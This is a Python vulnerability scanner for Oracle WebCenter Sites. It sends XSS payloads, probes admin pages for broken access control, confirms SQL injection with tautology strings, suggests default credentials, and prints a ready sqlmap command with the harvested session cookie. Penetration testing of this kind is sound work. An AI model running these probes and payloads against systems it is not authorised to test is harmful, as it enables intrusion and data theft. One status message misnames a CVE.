import re
import sys

import requests
from bs4 import BeautifulSoup

# Configs
proxies = {  # CHANGE ME <<<<<<<<<<<<<<<<<<
    "http": "http://localhost:8080",
    "https": "http://localhost:8080"
}
headers = {
    "User-Agent": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
}
satellite = "/cs/Satellite"
check_xss = "<script>alert(24)</script>"

# noinspection PyUnresolvedReferences
requests.packages.urllib3.disable_warnings()


def print_usage():
    print("Usage: python3 wcs_scanner.py https://example.com")


def parse_url(url_):
    if not url_.startswith("http"):
        print("[-] Error: URL scheme is invalid")
        print_usage()
        sys.exit(1)

    try:
        satellite_index = url_.index(satellite)
        return url_[:satellite_index]
    except ValueError:
        return url_.rstrip("/")


def request(method, endpoint, **kwargs):
    try:
        return requests.request(method, endpoint, headers=headers, proxies=proxies,
                                verify=False, allow_redirects=False, **kwargs)
    except requests.exceptions.RequestException:
        return None


def test_login_page():
    response = request("GET", base_url + "/cas/login")
    if response is not None and all(kw in response.text for kw in ("Oracle WebCenter Sites", "Secure User Login")):
        print("[+] Default login page may be exposed. "
              "You should try to login with the default credentials fwadmin:xceladmin")
    else:
        print("[-] Default login page not found")


def test_cve_2018_2791():
    """Test multiple XSS."""
    payloads = [
        "c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22>"
        "<script>alert(24)</script>",
        "destpage=%22<h1xxx<scriptalert(24)</script&pagename=OpenMarket/Xcelerate/UIFramework/LoginError",
    ]
    for p in payloads:
        response = request("GET", f"{url}?{p}")
        if response is not None and check_xss in response.text:
            print(f"[+] Vulnerable to CVE-2018-2791 (Multiple XSS)\n\tPayload: {url}?{p}")
            return

    print("[-] Not vulnerable to CVE-2018-3238 (Multiple XSS)")


def test_cve_2018_3238():
    """Test multiple XSS."""
    payloads = [
        "c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq%22>"
        "<script>alert(24)</script>",
        "pagename=OpenMarket/Xcelerate/Actions/Security/NoXceleditor&WemUI=qqq%27;}</script><script>alert(24)</script>",
        "pagename=OpenMarket/Xcelerate/Actions/Security/ProcessLoginRequest&WemUI=qqq%27;}</script>"
        "<script>alert(24)</script>"
    ]
    for p in payloads:
        response = request("GET", f"{url}?{p}")
        if response is not None and check_xss in response.text:
            print(f"[+] Vulnerable to CVE-2018-3238 (Multiple XSS)\n\tPayload: {url}?{p}")
            return

    print("[-] Not vulnerable to CVE-2018-3238 (Multiple XSS)")


def test_cve_2019_2578():
    """Test Broken Access Control vulnerability."""
    private_addresses = [
        "pagename=OpenMarket/Xcelerate/Admin/WebReferences",
        "pagename=OpenMarket/Xcelerate/Admin/Slots"
    ]
    bac_rex = r"<script[\d\D]*<throwexception/>"
    for pa in private_addresses:
        response = request("GET", f"{url}?{pa}")
        if response is not None and re.search(bac_rex, response.text):
            print(f"[+] Vulnerable to CVE-2019-2578 (Broken Access Control)\n\tEvidence: {url}?{pa}")
            return pa

    print("[-] Not vulnerable to CVE-2019-2578 (Broken Access Control)")
    return None


def test_cve_2019_2579(bac):
    """
    Test SQL Injection vulnerability.

    :param bac: Broken Access Control page to get _authkey_ and cookie
    """
    # Get query page for authkey
    response = request("GET", f"{url}?{bac}")
    if response is None:
        print("[-] Not vulnerable to CVE-2019-2579 (SQL Injection)")
        return

    # Get _authkey_
    soup = BeautifulSoup(response.text, "html.parser")
    auth_key_input = soup.find("input", attrs={"name": "_authkey_"})
    auth_key = auth_key_input.get("value")

    # Build POST request
    cookies = response.cookies
    data = {
        "_authkey_": auth_key,
        "pagename": bac.lstrip("pagename="),
        "op": "search",
        "urlsToDelete": "",
        "resultsPerPage": 25,
        "searchChoice": "webroot",
        "searchText": "' and '1'='0 -- "
    }
    sqli_url = base_url + "/cs/ContentServer"
    negative_responses = ("No URL were found for this search criteria", "No assets were found")

    # Look for negative search result
    negative_search = request("POST", sqli_url, data=data, cookies=cookies)
    if negative_search is None or not any(nr in negative_search.text for nr in negative_responses):
        print("[-] Not vulnerable to CVE-2019-2579 (SQL Injection)")
        return

    # Confirm SQLi with positive request
    data["searchText"] = "' or '1'='1 -- "
    positive_search = request("POST", sqli_url, data=data, cookies=cookies)
    if positive_search is not None and not any(nr in positive_search.text for nr in negative_responses):
        print(f"[+] Vulnerable to CVE-2019-2579 (SQL Injection)")
        print(f"[*] You should test this with sqlmap:\n"
              f"sqlmap --dbms Oracle --url {sqli_url} "
              f"--data '_authkey_={auth_key}&{bac}&op=search&urlsToDelete="
              f"&resultsPerPage=25&searchChoice=webroot&searchText=*' "
              f"--cookie 'JSESSIONID={cookies['JSESSIONID']}' --technique U")
        return

    print("[-] Not vulnerable to CVE-2019-2579 (SQL Injection)")


# Main script
if len(sys.argv) != 2:
    print_usage()
    sys.exit(0)

base_url = parse_url(sys.argv[1])
url = base_url + satellite
print(f"[!] Start scanning {base_url}")
if proxies:
    print(f"[*] Using proxies={proxies}")

print("\n[*] Look for default login page")
test_login_page()

print("\n[*] Testing CVE-2018-2791 and CVE-2018-3238 - Multiple XSS")
test_cve_2018_2791()
test_cve_2018_3238()

print("\n[*] Testing CVE-2019-2578 - Broken Access Control")
bac_url = test_cve_2019_2578()
if bac_url is not None:
    # SQLi can only exists if broken access control exists
    print("\n[*] Testing CVE-2019-2579 - SQL Injection")
    test_cve_2019_2579(bac_url)
